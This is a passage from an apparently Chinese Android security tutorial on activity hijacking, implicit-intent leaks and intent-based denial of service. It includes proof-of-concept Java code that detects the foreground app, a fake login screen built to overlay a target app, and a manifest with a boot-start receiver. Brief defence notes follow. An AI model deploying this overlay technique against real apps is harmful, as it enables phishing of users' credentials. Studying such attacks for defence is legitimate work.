
```java
public class ForegroundProcess {
public static final int AID_APP = 10000;
public static final int AID_USER = 100000;
public static String getForegroundApp() {
File[] files = new File("/proc").listFiles();
int lowestOomScore = Integer.MAX_VALUE;
String foregroundProcess = null;
for (File file : files) {
if (!file.isDirectory()) {
continue;
}
int pid;
try {
pid = Integer.parseInt(file.getName());
} catch (NumberFormatException e) {
continue;
}
try {
String cgroup = read(String.format("/proc/%d/cgroup", pid));
String[] lines = cgroup.split("\n");
String cpuSubsystem;
String cpuaccctSubsystem;
if (lines.length == 2) {// 有的手机里cgroup包含2行或者3行，我们取cpu和cpuacct两行数据
cpuSubsystem = lines[0];
cpuaccctSubsystem = lines[1];
} else if (lines.length == 3) {
cpuSubsystem = lines[0];
cpuaccctSubsystem = lines[2];
} else {
continue;
}
if (!cpuaccctSubsystem.endsWith(Integer.toString(pid))) {
// not an application process
continue;
}
if (cpuSubsystem.endsWith("bg_non_interactive")) {
// background policy
continue;
}
String cmdline = read(String.format("/proc/%d/cmdline", pid));
if (cmdline.contains("com.android.systemui")) {
continue;
}
int uid = Integer.parseInt(cpuaccctSubsystem.split(":")[2]
.split("/")[1].replace("uid_", ""));
if (uid >= 1000 && uid <= 1038) {
// system process
continue;
}
int appId = uid - AID_APP;
int userId = 0;
// loop until we get the correct user id.
// 100000 is the offset for each user.
while (appId > AID_USER) {
appId -= AID_USER;
userId++;
}
if (appId < 0) {
continue;
}
// u{user_id}_a{app_id} is used on API 17+ for multiple user
// account support.
// String uidName = String.format("u%d_a%d", userId, appId);
File oomScoreAdj = new File(String.format(
"/proc/%d/oom_score_adj", pid));
if (oomScoreAdj.canRead()) {
int oomAdj = Integer.parseInt(read(oomScoreAdj
.getAbsolutePath()));
if (oomAdj != 0) {
continue;
}
}
int oomscore = Integer.parseInt(read(String.format(
"/proc/%d/oom_score", pid)));
if (oomscore < lowestOomScore) {
lowestOomScore = oomscore;
foregroundProcess = cmdline;
}
} catch (IOException e) {
e.printStackTrace();
}
}
return foregroundProcess;
}
private static String read(String path) throws IOException {
StringBuilder output = new StringBuilder();
BufferedReader reader = new BufferedReader(new FileReader(path));
output.append(reader.readLine());
for (String line = reader.readLine(); line != null; line = reader
.readLine()) {
output.append('\n').append(line);
}
reader.close();
return output.toString().trim();// 不调用trim()，包名后会带有乱码
}
}
```

我们继续编写劫持替换的测试类

```java
public class SecondActivity extends AppCompatActivity {
private static Boolean flag ;
@Override
protected void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.activity_second);
Log.w("TAGSecod","切换");
EditText name = findViewById(R.id.editTextTextPersonName);
EditText passward = findViewById(R.id.editTextTextPassword);
Button button = findViewById(R.id.button);
button.setOnClickListener(new View.OnClickListener() {
@Override
public void onClick(View v) {
Log.w("TAG", "成功劫持进入该界面");
flag =false;
}
});
}
}
```

最后在我们的配置文件中加入相应的权限和配置信息：

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.example.activityhajacker">
<uses-permission android:name="android.permission.INTERNET" />
<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
<application
android:allowBackup="true"
android:icon="@mipmap/ic_launcher"
android:label="@string/app_name"
android:roundIcon="@mipmap/ic_launcher_round"
android:supportsRtl="true"
android:theme="@style/Theme.ActivityHajacker">
<activity android:name=".SecondActivity"></activity>
<service
android:name=".HijackingService"
android:enabled="true"
android:exported="true" />
<activity android:name=".MainActivity">
<intent-filter>
<action android:name="android.intent.action.MAIN" />
<category android:name="android.intent.category.LAUNCHER" />
</intent-filter>
</activity>
<receiver
android:name=".HijackingReciver"
android:enabled="true">
<intent-filter>
<action android:name="android.intent.action.BOOT_COMPLETED" />
</intent-filter>
</receiver>
</application>
</manifest>
```

我们需要将服务的时间设置成6秒，避免程序界面还未加载就劫持了

**效果演示：**

我们编写劫持类安装，打开：

![image-20210905193109596](upload/attach/202109/905443_PWWKGDWZH58HZQX.png)

我们可以发现劫持类在后台运行：

![image-20210905193315233](upload/attach/202109/905443_KCE6DPDEYYPH88N.png)

我们打开目标程序：

![image-20210905193402155](upload/attach/202109/905443_36ZC67RKXT6C7WJ.png)

等待5秒，然后劫持成功，这个时间我们可以在代码段调整：

![image-20210905193503857](upload/attach/202109/905443_AJDZTS8JGR3TZME.png)

这样我们成功完成了对目标程序劫持，这里我只编写了一个简易的界面，大家可以编写更加复杂的界面，这主要是针对Android 6.0平台的劫持，各位也可以试试其他版本的平台

### （3）安全防护

```java
如果真的爆发了这种恶意程序，我们并不能在启动程序时每一次都那么小心去查看判断当前在运行的是哪一个程序，当android:noHistory="true"时上面的方法也无效
目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。
梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。
参考网址：https://blog.csdn.net/ruingman/article/details/51146152
http://blog.chinaunix.net/uid-16728139-id-4962659.html
https://blog.csdn.net/u012195899/article/details/70172241?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-9.essearch_pc_relevant&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-9.essearch_pc_relevant
```

![image-20210905193503857](upload/attach/202109/905443_UMEKKKY2RDTQR9B.png)

通过它提示程序进入后台来提示用户

### 3.隐私启动Intent包含敏感数据

#### （1）原理介绍

```java
1.背景知识：Intent可分为隐私(implicitly)和显式(explicitly)两种
(1)显式Intent：即在构造Intent对象时就指定接收者，它一般用在知道目标组件名称的前提下，
一般是在相同的应用程序内部实现的，如下：
Intent intent = new Intent(MainActivit.this, NewActivity.class);
startActivity(intent);
(2)隐式Intent：即Intent的发送者在构造Intent对象时，并不知道也不关心接收者是谁，有利于
降低发送者和接收者之间的耦合，它一般用在没有明确指出目标组件名称的1前提下，一般是用于
不同应用程序之间，如下：
Intent intent = new Intent();
intent.setAction("com.wooyun.test");
startActivity(intent);
对于显式Intent，Android不需要去做解析，因为目标组件已经很明确，Android需要解析的是那些
隐式Intent,通过解析，将Intent映射给可以处理此Intent的Activity，IntentReceiver或Service
```

![image-20210905193503857](upload/attach/202109/905443_X25ZNSSHGKTPNWX.png)

```
我们有一个应用A,采用Intent隐式传递,它的动作是"X",此时还有一个应用B,动作也是X,我们在启动的时候，通过Intent隐式传递，就会同时弹出两个界面，我们就不知道到底启动A还是B
```

因为现在这种漏洞在Android版本更新后，基本很少出现了，所以这里就不做复现和安全防护了

### 4.拒绝服务攻击

#### （1）原理介绍

```java
原理介绍：
Android提供Intent机制来协助应用间的交互和通讯，通过Intent实现对应用中一次操作的动作、动作涉及数据、附加数据进行描述，Android通过Intent的描述，负责找到对应组件，完成调用。
拒绝服务攻击源于程序没有对Intent。getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用发送此类空数据、异常或者畸形数据来达到致使该应用crash的目的，我们可以通过intent发送空数据、异常或畸形数据给正常应用，导致其崩溃。本地拒绝服务可以被竞争方利用来攻击，使得自己的应用崩溃，造成破坏。
危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的
```

提到拒绝服务攻击，我们就不得不讲一下Android外部程序的调用方法：

```java
总结：
1.使用自定义Action
A程序中调用的代码为：
Intent intent = new Intent();
intent.setAction("com.test.action.PLAYER");
startActivity(intent);
B程序中的AndroidManifest.xml中启动Activity的intent-filter
<intent-filter>
<action android:name="android.intent.action.MAIN" />
<action android:name="com.test.action.PLAYER" />
<category android:name="android.intent.category.DEFAULT" /><!--必须，否则无效-->
<category android:name="android.intent.category.LAUNCHER" />
</intent-filter>
2.使用包类名
A程序中调用的代码为：
Intent intent = new Intent();
intent.setClassName("com.test", "com.test.Player");//目标程序包名、主进程名
startActivity(intent);
intent.setClassName(arg1,arg2)中arg1是被调用程序B的包名，arg2是B程序中目的activity的完整类名
或者使用ComponentName
Intent intent = new Intent();
ComponentName comp = new ComponentName("com.test", "com.test.Player" ); //目标程序包名、主进程名
intent.setComponent(comp);
startActivity(intent);
B程序被调用中AndroidManifest.xml中启动Activity的intent-filter不需要特别加入其它信息，如下即可：
<intent-filter>
<action android:name="android.intent.action.MAIN" />
<category android:name="android.intent.category.LAUNCHER" />
</intent-filter>
```

#### （2）漏洞复现

我们查看一个目标应用的AndroidManifest.xml文件：
